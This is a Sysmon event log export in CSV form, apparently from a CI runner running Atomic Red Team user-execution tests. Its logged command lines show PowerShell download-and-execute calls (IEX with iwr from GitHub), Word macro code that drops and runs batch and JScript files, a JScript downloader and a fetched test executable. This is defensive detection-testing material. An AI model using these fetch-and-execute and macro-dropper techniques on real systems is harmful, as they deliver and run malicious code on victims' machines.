"TimeCreated","Id","Message"
"12/17/2025 7:58:45 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:58:45.048
ProcessGuid: {f995aebf-62b5-6942-5104-000000000e00}
ProcessId: 8632
Image: C:\Users\RUNNER~1\AppData\Local\Temp\PotentiallyUnwanted.exe
ImageLoaded: C:\Users\RUNNER~1\AppData\Local\Temp\PotentiallyUnwanted.exe
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA256=42D6581DD0A2BA9BEC6A40C5B7C85870A8019D7347C9130D24752EC5865F0732
Signed: false
Signature: -
SignatureStatus: Unavailable
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:45 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:45.043
ProcessGuid: {f995aebf-62b5-6942-5104-000000000e00}
ProcessId: 8632
Image: C:\Users\RUNNER~1\AppData\Local\Temp\PotentiallyUnwanted.exe
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
CommandLine: ""C:\Users\RUNNER~1\AppData\Local\Temp\PotentiallyUnwanted.exe""
CurrentDirectory: C:\Users\runneradmin\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=42D6581DD0A2BA9BEC6A40C5B7C85870A8019D7347C9130D24752EC5865F0732
ParentProcessGuid: {f995aebf-62b4-6942-4f04-000000000e00}
ParentProcessId: 7420
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""powershell.exe"" & {Invoke-WebRequest http://amtso.eicar.org/PotentiallyUnwanted.exe -OutFile $env:TEMP/PotentiallyUnwanted.exe
& \""""$env:TEMP/PotentiallyUnwanted.exe\""""}
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:44 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:43.399
ProcessGuid: {f995aebf-62b3-6942-4d04-000000000e00}
ProcessId: 9124
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.103
SourceHostname: runnervm8j6r3.5cxh0c1awo1ufoksjxtfocoz2d.ex.internal.cloudapp.net
SourcePort: 52083
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:58:44 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:44.092
ProcessGuid: {f995aebf-62b4-6942-4f04-000000000e00}
ProcessId: 7420
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_dgzefwqv.ruu.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:44 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:44.003
ProcessGuid: {f995aebf-62b4-6942-4f04-000000000e00}
ProcessId: 7420
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Invoke-WebRequest http://amtso.eicar.org/PotentiallyUnwanted.exe -OutFile $env:TEMP/PotentiallyUnwanted.exe
& \""""$env:TEMP/PotentiallyUnwanted.exe\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:43 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:41.633
ProcessGuid: {f995aebf-62b1-6942-4904-000000000e00}
ProcessId: 3424
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.103
SourceHostname: runnervm8j6r3.5cxh0c1awo1ufoksjxtfocoz2d.ex.internal.cloudapp.net
SourcePort: 52082
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:58:43 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:41.628
ProcessGuid: {f995aebf-62b1-6942-4904-000000000e00}
ProcessId: 3424
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:43 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:40.687
ProcessGuid: {f995aebf-62b0-6942-4704-000000000e00}
ProcessId: 7388
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:43 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:58:43.404
ProcessGuid: {f995aebf-62b3-6942-4d04-000000000e00}
ProcessId: 9124
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:43 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:43.172
ProcessGuid: {f995aebf-62b3-6942-4d04-000000000e00}
ProcessId: 9124
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_kl0cmset.goq.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:43 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:43.079
ProcessGuid: {f995aebf-62b3-6942-4d04-000000000e00}
ProcessId: 9124
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
Invoke-Maldoc -macroFile \""""C:\AtomicRedTeam\atomics\T1204.002\src\chromeexec-macrocode.txt\"""" -officeProduct \""""Word\"""" -sub \""""ExecChrome\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:42 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:40.692
ProcessGuid: {f995aebf-62b0-6942-4704-000000000e00}
ProcessId: 7388
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.103
SourceHostname: runnervm8j6r3.5cxh0c1awo1ufoksjxtfocoz2d.ex.internal.cloudapp.net
SourcePort: 52081
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:58:42 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:39.748
ProcessGuid: {f995aebf-62af-6942-4304-000000000e00}
ProcessId: 6180
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:42 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:42.338
ProcessGuid: {f995aebf-62b2-6942-4b04-000000000e00}
ProcessId: 3944
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_tcjyadpj.fgd.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:41 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:39.753
ProcessGuid: {f995aebf-62af-6942-4304-000000000e00}
ProcessId: 6180
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.103
SourceHostname: runnervm8j6r3.5cxh0c1awo1ufoksjxtfocoz2d.ex.internal.cloudapp.net
SourcePort: 52080
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:58:41 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:58:41.639
ProcessGuid: {f995aebf-62b1-6942-4904-000000000e00}
ProcessId: 3424
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:41 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:39.040
ProcessGuid: {f995aebf-62ae-6942-4204-000000000e00}
ProcessId: 2104
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;
Image: C:\Windows\System32\cscript.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:41 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:41.397
ProcessGuid: {f995aebf-62b1-6942-4904-000000000e00}
ProcessId: 3424
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_fsatglnb.hja.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:41 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:41.302
ProcessGuid: {f995aebf-62b1-6942-4904-000000000e00}
ProcessId: 3424
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
$macrocode = \""""   Open `\""""$(\""""$env:temp\art1204.bat\"""")`\"""" For Output As #1`n   Write #1, `\""""calc.exe`\""""`n   Close #1`n   a = Shell(`\""""cmd.exe /c $(\""""$env:temp\art1204.bat\"""") `\"""", vbNormalFocus)`n\""""
Invoke-MalDoc -macroCode $macrocode -officeProduct Word}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:40 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:58:40.697
ProcessGuid: {f995aebf-62b0-6942-4704-000000000e00}
ProcessId: 7388
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:40 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:39.044
ProcessGuid: {f995aebf-62ae-6942-4204-000000000e00}
ProcessId: 2104
Image: C:\Windows\System32\cscript.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.103
SourceHostname: runnervm8j6r3.5cxh0c1awo1ufoksjxtfocoz2d.ex.internal.cloudapp.net
SourcePort: 52078
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:58:40 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:38.288
ProcessGuid: {f995aebf-62ad-6942-3e04-000000000e00}
ProcessId: 6640
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:40 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:40.460
ProcessGuid: {f995aebf-62b0-6942-4704-000000000e00}
ProcessId: 7388
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ba5hrlv5.3rb.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:40 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:40.369
ProcessGuid: {f995aebf-62b0-6942-4704-000000000e00}
ProcessId: 7388
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
$macrocode = \""""   Open `\""""C:\Users\Public\art.jse`\"""" For Output As #1`n   Write #1, `\""""WScript.Quit`\""""`n   Close #1`n   a = Shell(`\""""cmd.exe /c wscript.exe //E:jscript C:\Users\Public\art.jse`\"""", vbNormalFocus)`n\""""
Invoke-MalDoc -macroCode $macrocode -officeProduct \""""Word\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:39 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:58:39.759
ProcessGuid: {f995aebf-62af-6942-4304-000000000e00}
ProcessId: 6180
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:39 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:39.520
ProcessGuid: {f995aebf-62af-6942-4304-000000000e00}
ProcessId: 6180
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_wm2fvrr3.df3.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:39 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:38.293
ProcessGuid: {f995aebf-62ad-6942-3e04-000000000e00}
ProcessId: 6640
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.103
SourceHostname: runnervm8j6r3.5cxh0c1awo1ufoksjxtfocoz2d.ex.internal.cloudapp.net
SourcePort: 52077
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:58:39 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:39.427
ProcessGuid: {f995aebf-62af-6942-4304-000000000e00}
ProcessId: 6180
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
$macrocode = \""""  a = Shell(`\""""cmd.exe /c choice /C Y /N /D Y /T 3`\"""", vbNormalFocus)\""""
Invoke-MalDoc -macroCode $macrocode -officeProduct \""""Word\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:39 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:58:39.048
ProcessGuid: {f995aebf-62ae-6942-4204-000000000e00}
ProcessId: 2104
Image: C:\Windows\system32\cscript.exe
TargetObject: HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:39 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:58:39.026
ProcessGuid: {f995aebf-62ae-6942-4204-000000000e00}
ProcessId: 2104
Image: C:\Windows\System32\cscript.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.5-0\MpClient.dll
FileVersion: 4.18.25110.5 (4a6978a838df7287d907bb2ee8a2eeb2373b186e)
Description: Client Interface
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: mpclient.dll
Hashes: SHA256=F1CA293E6D05A500EB026529A27948B01B6467D0E9C20C6049101C2B2829B96A
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:39 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:58:39.006
ProcessGuid: {f995aebf-62ae-6942-4204-000000000e00}
ProcessId: 2104
Image: C:\Windows\System32\cscript.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.5-0\MpOAV.dll
FileVersion: 4.18.25110.5 (4a6978a838df7287d907bb2ee8a2eeb2373b186e)
Description: IOfficeAntiVirus Module
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: MpOAV.dll
Hashes: SHA256=0EF8AE9CC8E3722C0AE09B55531BBA2F2A3422CCF4A1BB9B37ABDB4808AAC232
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:38 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:38.973
ProcessGuid: {f995aebf-62ae-6942-4204-000000000e00}
ProcessId: 2104
Image: C:\Windows\System32\cscript.exe
FileVersion: 10.0.26100.7019
Description: Microsoft ? Console Based Script Host
Product: Microsoft ? Windows Script Host
Company: Microsoft Corporation
OriginalFileName: cscript.exe
CommandLine: cscript  //E:Jscript C:\Users\RUNNER~1\AppData\Local\Temp\OSTapGet.js
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9521FCB41599FBEE8F44182F77E19F0FCA97D4E8199B1E8D97FCAD66B5A55DB2
ParentProcessGuid: {f995aebf-62ae-6942-4004-000000000e00}
ParentProcessId: 9100
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c echo var url = ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile('ostapout.txt', 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\OSTapGet.js & cscript //E:Jscript %TEMP%\OSTapGet.js
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:38 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:58:38.298
ProcessGuid: {f995aebf-62ad-6942-3e04-000000000e00}
ProcessId: 6640
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:38 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:38.050
ProcessGuid: {f995aebf-62ad-6942-3e04-000000000e00}
ProcessId: 6640
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_c4vd3d0a.2ck.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
